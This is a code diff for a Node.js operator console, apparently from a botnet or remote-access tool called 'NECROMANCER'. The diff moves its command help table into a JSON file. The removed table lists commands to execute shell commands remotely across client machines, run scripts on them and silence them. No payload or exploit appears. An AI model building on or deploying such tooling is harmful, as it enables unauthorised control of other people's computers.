@@ -1,44 +1,12 @@
 import readline from "readline";
 import fs from "fs";
 import { clientModules, broadcast } from "./server.js";
+import help from "./help.json" assert { type: "json" };
 
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout,
 });
-
-const commandsHelp = [
-  {
-    command: "exec",
-    functionality: "Executes shell commands remotely",
-    usage: "exec <command>",
-  },
-  {
-    command: "instances",
-    functionality: "Limits number of machines running a command",
-    usage: "instances <number>",
-  },
-  {
-    command: "run",
-    functionality: "Runs custom scripts you have",
-    usage: "run (script name)",
-  },
-  {
-    command: "help",
-    functionality: "Shows you how to use commands",
-    usage: "help <command>",
-  },
-  {
-    command: "scripts",
-    functionality: "Lists custom scripts you have",
-    usage: "scripts",
-  },
-  {
-    command: "silent",
-    functionality: "Silents clients from responding",
-    usage: "silent (boolean)",
-  },
-];
 
 export function prompt() {
   rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
@@ -64,19 +32,19 @@ export function prompt() {
     if (message.startsWith("help")) {
       if (message === "help") {
         console.log("Commands:");
-        for (let i = 0; i < commandsHelp.length; i++) {
-          console.log(commandsHelp[i].command);
+        for (let i = 0; i < help.length; i++) {
+          console.log(help[i].command);
         }
       } else if (
-        commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
+        help.filter((i) => i.command === message.split(" ")[1]).length >
         0
       ) {
-        let commandIndex = commandsHelp
+        let commandIndex = help
           .map((i) => i.command)
           .indexOf(message.split(" ")[1]);
 
         console.log(
-          `Functionality: ${commandsHelp[commandIndex].functionality}\nUsage: ${commandsHelp[commandIndex].usage}`
+          `Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
         );
       }
     }
